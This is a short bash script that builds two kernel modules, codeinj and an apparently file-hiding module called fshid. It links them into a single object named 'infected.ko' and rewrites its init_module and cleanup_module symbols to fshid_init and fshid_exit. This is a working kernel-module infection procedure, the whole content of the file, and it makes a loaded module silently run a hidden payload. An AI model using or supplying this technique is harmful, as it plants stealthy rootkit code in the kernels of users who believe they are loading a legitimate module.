#!/usr/bin/env bash


(cd fshid && make --quiet) &&
    make --quiet &&
    ld -r codeinj.ko fshid/fshidko.ko -o infected.ko &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit &&
    setsym infected.ko init_module $(setsym infected.ko fshid_init) &&
    setsym infected.ko cleanup_module $(setsym infected.ko fshid_exit) &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit
